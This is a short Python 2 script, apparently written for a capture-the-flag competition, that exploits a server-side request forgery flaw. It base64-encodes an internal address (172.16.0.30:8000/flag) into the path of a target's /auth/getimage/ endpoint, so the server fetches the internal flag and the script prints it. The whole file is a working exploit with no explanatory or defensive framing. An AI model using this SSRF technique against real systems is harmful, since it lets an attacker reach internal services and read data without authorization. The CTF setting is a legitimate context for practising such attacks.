#!/usr/bin/env python
# encoding:utf-8

'''
Get flag by SSRF vulnerability
'''

import requests

def get_flag(host, port):
    payload = "http://172.16.0.30:8000/flag".encode("base64").replace("\n", "")
    url ="http://%s:%d/auth/getimage/%s" %(host, port, payload)
    print url
    content = requests.get(url, timeout=5).content
    print content
    return content

if __name__ == "__main__":
    get_flag("172.16.0.161", 80)

